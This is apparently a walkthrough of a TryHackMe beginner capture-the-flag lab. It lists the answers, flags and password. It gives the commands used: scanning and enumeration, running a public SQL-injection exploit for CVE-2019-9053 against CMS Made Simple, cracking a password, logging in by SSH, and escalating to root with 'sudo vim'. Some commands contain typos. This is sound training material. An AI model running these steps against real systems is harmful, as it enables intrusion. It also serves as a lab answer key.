# <div align="center">[Simple CTF](https://tryhackme.com/r/room/easyctf)</div>
<div align="center">Beginner level ctf</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/a035c702-c26a-4654-93bf-0115e10f9f1b" height="200"></img>
</div>

## Task 1. Simple CTF

Deploy the machine and attempt the questions!
### How many services are running under port 1000?
```
2
```
* ```nmap -sC -Cv 10.10.25.90```
### What is running on the higher port?
```
ssh
```

### What's the CVE you're using against the application?
````
CVE-2019-9053
````
* ```diresearch -u 10.10.10.10 ```
As a result, we will find a page ```http://10.10.10.10/simple/``` when we go to it, in the lower left corner,
we see what CMS this page was created, it turned out to be "CMS Made Simple 2.2.8" google - CMS Made Simple 2.2.8. [Exploit](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Simple-CTF/exploit.py)
The very first page https://www.exploit-db.com/exploits/46635 shows that this The CMS is vulnerable to SQL injection and a python exploit has been prepared for this vulnerability (you can find a copy of the file https://github.com/BEPb/tryhackme/blob/master/01.easy/Simple%20CTF/exploit.py) command to download the file to

## To what kind of vulnerability is the application vulnerable?
```
sqli
```
### What's the password?
```
secret
```
* ```pip install termcolor```
* ```python exploit.py -u http://10.10.25.90/simple --crack -w /usr/share/wordlists/rockyou.txt```
### Where can you login with the details obtained?
```
ssh
```
* ```ssh mitch@10.10.10.10 -p 2222```
### What's the user flag?
```
G00d j0b, keep up!
```
* ```cat user.txt```
### Is there any other user in the home directory? What's its name?
```
sunbath
```
* ```cd .. && ls```
### What can you leverage to spawn a privileged shell?
```
vim
```
* ```sudo -l```
* ```sudo vim -c ‘:!/bin/sh’```
### What's the root flag?
```
W3ll d0n3. You made it!
```
* ```cat /root/root.txt```

Done 😄
